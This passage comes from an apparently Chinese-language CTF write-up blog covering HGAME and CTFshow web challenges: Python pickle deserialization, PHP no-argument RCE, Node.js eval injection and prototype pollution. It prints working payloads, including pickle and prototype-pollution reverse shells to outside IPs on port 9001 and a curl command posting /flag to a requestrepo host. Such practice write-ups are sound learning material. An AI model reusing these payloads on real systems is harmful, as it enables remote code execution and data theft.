socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;43.129.237.123&quot;,9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> os.system, (s,)<br><br><br>a = A()<br><span class="hljs-built_in">print</span>((pickle.dumps(a)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;----------------&#x27;</span>)<br>pickle_data = pickle.dumps(a)<br>user = base64.b64encode(pickle_data).decode()<br><span class="hljs-built_in">print</span>(user)<br>pickle.loads(base64.b64decode(user))<br></code></pre></td></tr></table></figure><p>试了两种方法都不成功:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;curl -X POST --data \&quot;`cat /flag`\&quot; http://tscf5b3d.requestrepo.com&#x27;)&quot;</span>,))<br><br><br>a = A()<br><span class="hljs-built_in">print</span>((pickle.dumps(a)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;----------------&#x27;</span>)<br>pickle_data = pickle.dumps(a)<br>user = base64.b64encode(pickle_data).decode() <span class="hljs-comment">#base64加密后的数据</span><br><span class="hljs-built_in">print</span>(user)<br>pickle.loads(base64.b64decode(user))<br></code></pre></td></tr></table></figure><p>没结果:(等wp出来看看👀</p><h2 id="HGAME-Select-More-Courses"><a href="#HGAME-Select-More-Courses" class="headerlink" title="[HGAME]Select More Courses"></a>[HGAME]Select More Courses</h2><p>密码弱口令，找个top1000爆破一下就行：</p><p><img src="/img/selectmore1.png" alt="selectmore1"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">qwert123<br></code></pre></td></tr></table></figure><p>然后是这题的逻辑：需要把<code>创业基础</code>这门课选上，不过学分满了需要扩学分(扩学分要求绩点3.5，当前绩点只有3)，需要扩完学分再去抢课。</p><p><code>/expand</code>路由给了提示说<code>Race against time</code>(利用条件竞争)。但还是没啥思路👀等wp出来看看</p><h2 id="CTFshow-部分："><a href="#CTFshow-部分：" class="headerlink" title="[CTFshow]部分："></a>[CTFshow]部分：</h2><h3 id="CTFShow-命令执行-web40"><a href="#CTFShow-命令执行-web40" class="headerlink" title="[CTFShow 命令执行]web40"></a>[CTFShow 命令执行]web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>几乎把能过滤的符号都过滤了。。</p><p><a href="https://xiaofeiji-77.github.io/2021/08/22/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87/">参考资料-无参RCE</a></p><ul><li>利用var_dump(scandir(‘.’));查看当前目录下所有文件名</li><li>localeconv() 函数返回一包含本地数字及货币格式信息的数组，数组第一项是<code>.</code></li><li>current() 函数返回数组中的当前元素（单元）,默认取第一个值</li></ul><p>综上，构造&#x2F;<code>?c=var_dump(scandir(current(localeconv()));</code>即可查看当前目录中的文件顺序。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;flag.php&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>目标是倒数第二项，直接:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br></code></pre></td></tr></table></figure><h3 id="CTFshow-nodejs-web334"><a href="#CTFshow-nodejs-web334" class="headerlink" title="[CTFshow nodejs]web334"></a>[CTFshow nodejs]web334</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//login.js</span><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> users = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../modules/user&#x27;</span>).<span class="hljs-property">items</span>;<br> <br><span class="hljs-keyword">var</span> findUser = <span class="hljs-keyword">function</span>(<span class="hljs-params">name, password</span>)&#123;<br>  <span class="hljs-keyword">return</span> users.<span class="hljs-title function_">find</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">item</span>)&#123;<br>    <span class="hljs-keyword">return</span> name!==<span class="hljs-string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="hljs-property">username</span> === name.<span class="hljs-title function_">toUpperCase</span>() &amp;&amp; item.<span class="hljs-property">password</span> === password;<br>  &#125;);<br>&#125;;<br><br><span class="hljs-comment">/* GET home page. */</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> sess = req.<span class="hljs-property">session</span>;<br>  <span class="hljs-keyword">var</span> user = <span class="hljs-title function_">findUser</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>, req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>);<br> <br>  <span class="hljs-keyword">if</span>(user)&#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-title function_">regenerate</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>) &#123;<br>      <span class="hljs-keyword">if</span>(err)&#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录失败&#x27;</span>&#125;);        <br>      &#125;<br>       <br>      req.<span class="hljs-property">session</span>.<span class="hljs-property">loginUser</span> = user.<span class="hljs-property">username</span>;<br>      res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录成功&#x27;</span>,<span class="hljs-attr">ret_flag</span>:flag&#125;);              <br>    &#125;);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;账号或密码错误&#x27;</span>&#125;);<br>  &#125;  <br>  <br>&#125;);<br><span class="hljs-comment">//user.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">items</span>: [<br>    &#123;<span class="hljs-attr">username</span>: <span class="hljs-string">&#x27;CTFSHOW&#x27;</span>, <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;123456&#x27;</span>&#125;<br>  ]<br>&#125;;<br></code></pre></td></tr></table></figure><p><code>user.js</code>给了用户名和密码，但<code>login.js</code>对登录进行了限制：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> findUser = <span class="hljs-keyword">function</span>(<span class="hljs-params">name, password</span>)&#123;<br>  <span class="hljs-keyword">return</span> users.<span class="hljs-title function_">find</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">item</span>)&#123;<br>    <span class="hljs-keyword">return</span> name!==<span class="hljs-string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="hljs-property">username</span> === name.<span class="hljs-title function_">toUpperCase</span>() &amp;&amp; item.<span class="hljs-property">password</span> === password;<br></code></pre></td></tr></table></figure><p>所以<code>ctfshow</code>密码<code>123456</code>登录就行。</p><p>最后是这个<code>toUpperCase()</code>，有时大小写转换的时候很容易出问题，具体参考[GYCTF2020]Ez_Express。</p><h3 id="CTFshow-nodejs-web335"><a href="#CTFshow-nodejs-web335" class="headerlink" title="[CTFshow nodejs]web335"></a>[CTFshow nodejs]web335</h3><p>右键源码提示<code>/?eval=</code>，看着像命令执行？试试：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?eval=process.mainModule.require(&#x27;child_process&#x27;).exec<span class="hljs-constructor">Sync(&#x27;<span class="hljs-params">ls</span>&#x27;)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br><br><span class="hljs-comment">//结果：</span><br>app.js bin fl00g.txt modules node_modules package-lock.json package.json public routes sessions views <br><br><span class="hljs-comment">//所以：</span><br>?eval=process.mainModule.require(&#x27;child_process&#x27;).exec<span class="hljs-constructor">Sync(&#x27;<span class="hljs-params">cat</span> <span class="hljs-params">fl00g</span>.<span class="hljs-params">txt</span>&#x27;)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br></code></pre></td></tr></table></figure><h3 id="CTFshow-nodejs-web336"><a href="#CTFshow-nodejs-web336" class="headerlink" title="[CTFshow nodejs]web336"></a>[CTFshow nodejs]web336</h3><p>和上题一样，还是需要给<code>eval</code>参数传参然后执行命令，不过这次ban了<code>exec</code></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?eval=<span class="hljs-built_in">process</span>.mainModule.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).spawnSync(<span class="hljs-string">&#x27;cat&#x27;</span>,[<span class="hljs-string">&#x27;fl001g.txt&#x27;</span>]).<span class="hljs-keyword">stdout</span>.toString()<span class="hljs-comment"></span><br><span class="hljs-comment">//spawnSync：(命令，命令的参数数组)</span><br></code></pre></td></tr></table></figure><p>一开始想着过滤了<code>exec</code>就拼接一下试试：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">?<span class="hljs-built_in">eval</span>=process.mainModule.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat fl00g.txt&#x27;</span>).toString()<br></code></pre></td></tr></table></figure><p>不过不太明白为啥没成功。。</p><h3 id="CTFshow-nodejs-web337"><a href="#CTFshow-nodejs-web337" class="headerlink" title="[CTFshow nodejs]web337"></a>[CTFshow nodejs]web337</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">s</span>) &#123;<br>  <span class="hljs-keyword">return</span> crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;md5&#x27;</span>)<br>    .<span class="hljs-title function_">update</span>(s)<br>    .<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">/* GET home page. */</span><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;xxxxxxx&#x27;</span>;<br>  <span class="hljs-keyword">var</span> a = req.<span class="hljs-property">query</span>.<span class="hljs-property">a</span>;<br>  <span class="hljs-keyword">var</span> b = req.<span class="hljs-property">query</span>.<span class="hljs-property">b</span>;<br>  <span class="hljs-keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="hljs-property">length</span>===b.<span class="hljs-property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="hljs-title function_">md5</span>(a+flag)===<span class="hljs-title function_">md5</span>(b+flag))&#123;<br>  res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;tql&#x27;</span>&#125;);<br>  &#125;<br>  <br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>和[NPUCTF2020]验证🐎类似的知识点：js这东西和php有点像，也存在弱等于强等于绕过的问题。</p><p><code>?a[x]=1&amp;b[x]=2</code>。解法很多，<a href="https://blog.csdn.net/Yb_140/article/details/124510337">参考资料</a></p><h3 id="CTFshow-nodejs-web338"><a href="#CTFshow-nodejs-web338" class="headerlink" title="[CTFshow nodejs]web338"></a>[CTFshow nodejs]web338</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//login.js</span><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(),<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.<span class="hljs-property">session</span>;<br>  <span class="hljs-keyword">let</span> user = &#123;&#125;;<br>  utils.<span class="hljs-title function_">copy</span>(user,req.<span class="hljs-property">body</span>);<br>  <span class="hljs-keyword">if</span>(secert.<span class="hljs-property">ctfshow</span>===<span class="hljs-string">&#x27;36dboy&#x27;</span>)&#123;<br>    res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录失败&#x27;</span>+<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(user)&#125;);  <br>  &#125;<br>  <br>  <br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br><span class="hljs-comment">//common.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">copy</span>:copy<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy</span>(<span class="hljs-params">object1, object2</span>)&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> object2) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> object2 &amp;&amp; key <span class="hljs-keyword">in</span> object1) &#123;<br>            <span class="hljs-title function_">copy</span>(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>其实这个<code>copy</code>函数看了之后发现就跟<code>merge</code>函数似的。所以登录时抓包这么改：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;11111&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;11111&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;ctfshow&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;36dboy&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>即可。</p><p>原型链污染简单说就是当获取某个对象的某个成员时，如果找不到就会通过原型链一步步往上找，直到某个父类的原型为<code>null</code>为止。所以修改对象的某个父类的<code>prototype</code>的原型就可以通过原型链影响到跟此类有关的所有对象。</p><h3 id="CTFshow-nodejs-web339"><a href="#CTFshow-nodejs-web339" class="headerlink" title="[CTFshow nodejs]web339"></a>[CTFshow nodejs]web339</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//login.js</span><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">username</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">password</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">normalUser</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span><br>&#125;<br><br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(),<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.<span class="hljs-property">session</span>;<br>  <span class="hljs-keyword">let</span> user = &#123;&#125;;<br>  utils.<span class="hljs-title function_">copy</span>(user,req.<span class="hljs-property">body</span>);<br>  <span class="hljs-keyword">if</span>(secert.<span class="hljs-property">ctfshow</span>===flag)&#123;<br>    res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录失败&#x27;</span>+<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(user)&#125;);  <br>  &#125;<br>  <br>  <br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br><span class="hljs-comment">//这里限制了secert.ctfshow===flag才给flag，不是单纯的原型链污染</span><br><br><span class="hljs-comment">//api.js</span><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(),<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;api&#x27;</span>, &#123; <span class="hljs-attr">query</span>: <span class="hljs-title class_">Function</span>(query)(query)&#125;);<br>   <br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>通过原型链污染去实现RCE，利用点就是<code>api</code>路由中的<code>Function(query)(query)</code>：</p><blockquote><p>Function(query)是一个函数构造器，它将一个字符串参数(query)作为函数体，然后返回一个新的函数。这个新的函数可以接受任意数量的参数并执行query字符串中的JavaScript代码。而后面的(query)则是将这个新生成的函数再次调用，并将参数query传递给它。<br><a href="https://blog.csdn.net/m0_64815693/article/details/130076401">参考资料</a></p></blockquote><p>所以和上题一样，在<code>login</code>界面触发污染，<code>query</code>是需要执行的命令，然后POST形式访问<code>api</code>路由触发函数调用。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;query&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/43.135.4.198/9001 0&gt;&amp;1\&quot;&#x27;)&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>最后是这个payload为啥这么写：node 基于 chrome v8 内核，运行时不会有 <code>require</code> 这种关键字，模块加载不进来。</p><h3 id="CTFshow-nodejs-web340"><a href="#CTFshow-nodejs-web340" class="headerlink" title="[CTFshow nodejs]web340"></a>[CTFshow nodejs]web340</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//login.js</span><br><span class="hljs-keyword">var</span> express = 